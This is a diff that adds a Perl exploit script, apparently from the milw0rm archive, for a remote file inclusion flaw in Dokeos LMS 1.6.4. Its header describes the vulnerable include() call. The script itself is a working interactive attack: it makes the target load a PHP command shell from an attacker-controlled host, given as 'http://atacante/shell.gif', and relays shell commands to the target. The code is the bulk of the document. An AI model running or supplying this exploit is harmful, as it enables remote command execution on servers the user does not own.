@@ -1,0 +1,75 @@
+#!/usr/bin/perl
+############
+# Dokeos Learning Management System 1.6.4 Remote File Include
+# Exploit & Advisorie:  beford <xbefordx gmail com>
+#
+# uso:# 	perl own.pl <host> <cmd-shell-url> <cmd-var>
+# 		perl own.pl http://host.com/dokeos/ http://atacante/shell.gif cmd
+#
+# cmd shell example: <? system($cmd); ?>
+# cmd variable: cmd;
+#
+#############
+# Description
+#############
+# Vendor: http://www.dokeos.com/
+# The file dokeos/claroline/auth/ldap/authldap.php uses the variable 
+# includePath in a include() function without being declared. 
+# This issue has already been fixed in current claroline.net version, 
+# but dokeos still uses a  vulnerable version.
+############
+# Vulnerable code
+############
+# include ("$includePath/../auth/ldap/ldap_var.inc.php");
+############
+use LWP::UserAgent;
+
+$Path = $ARGV[0];
+$Pathtocmd = $ARGV[1];
+$cmdv = $ARGV[2];
+if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv) { usage(); }
+head();
+while() {
+	print "[shell] \$";
+	while(<STDIN>)      {
+		$cmd=$_;
+		chomp($cmd);
+		if (!$cmd) {last;}  
+		$xpl = LWP::UserAgent->new() or die;
+		$req = HTTP::Request->new(GET =>$Path.'claroline/auth/ldap/authldap.php?includePath='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";
+		$res = $xpl->request($req);
+		$return = $res->content;
+		$return =~ tr/[\n]/[ê]/;
+		if ($return =~/Error: HTTP request failed!/ ) {
+			print "\nInvalid path for phpshell\n";
+			exit;
+		} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {
+			print "\nInvalid Command, error.\n\n";
+		}
+		if ($return =~ /(.*)/) {
+			$finreturn = $1;
+			$finreturn=~ tr/[ê]/[\n]/;
+			print "\r\n$finreturn\n\r";
+			last;
+		} else {
+			print "[shell] \$";
+		}
+	}
+} last;
+
+sub head()  { 
+	print "\n============================================================================\r\n";
+	print "  Dokeos Learning Management System Remote File Include\r\n";
+	print "============================================================================\r\n";
+ }
+ 
+sub usage() {
+	head();
+	print " Usage: perl own.pl <host> <url-cmd> <var>\r\n\n";
+	print " <host> - Full Path : http://host/dokeos/ \r\n";
+	print " <url-cmd> - PhpShell : http://atacate/shell.gif \r\n";
+	print " <var> - var name used in phpshell : cmd  \r\n\r\n";
+	exit();
+ }
+
+# milw0rm.com [2006-05-08]
